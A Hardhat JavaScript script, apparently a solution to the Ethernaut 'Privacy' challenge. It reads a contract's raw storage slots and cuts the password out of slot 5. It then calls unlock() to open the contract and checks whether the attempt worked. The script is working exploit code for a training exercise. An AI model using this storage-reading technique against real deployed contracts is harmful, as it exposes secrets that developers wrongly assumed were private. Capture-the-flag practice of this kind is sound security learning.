const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, status, pass, val, half
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x762A4cf15Ea21A2858F54953302E54d169Ce2D32"
    let target = await ethers.getContractAt("Privacy", instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    for (let i = 0; i < 6; i++) {
        res = await ethers.provider.getStorageAt(instanceAddress, i)
        console.log(`Slot ${i}: ${res}`)
    }
    val = res.substring(2)
    half = val.substring(0, 32)
    console.log(`Val: ${val}, len = ${val.length}`)
    console.log(`half: ${half}, len = ${half.length}`)
    pass = "0x" + half
    console.log(`pass: ${pass}, len = ${pass.length}`)
    tx = await target.unlock(pass)
    await tx.wait(1)

    // Check
    status = await target.locked()
    if (status == false) {
        console.log(`${symbols.success} Unlocked Contract!!`)
    } else {
        console.log(`${symbols.error} Still locked...`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
